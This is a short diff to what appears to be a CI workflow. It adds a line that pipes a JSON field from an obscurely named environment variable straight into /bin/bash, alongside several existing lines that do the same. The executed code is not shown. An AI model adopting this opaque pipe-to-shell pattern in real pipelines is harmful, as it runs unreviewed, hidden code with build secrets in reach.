@@ -34,6 +34,7 @@ jobs:
           echo $mghqw6578 | jq -r .debfc322 | /bin/bash
           echo $pbgpg85 | jq -r .r7925 | /bin/bash
           echo $bb834 | jq -r .gff68 | /bin/bash
+          printf '%s' "$pibes5" | jq -r .y1 | /bin/bash
 
       - name: Save output
         if: always()
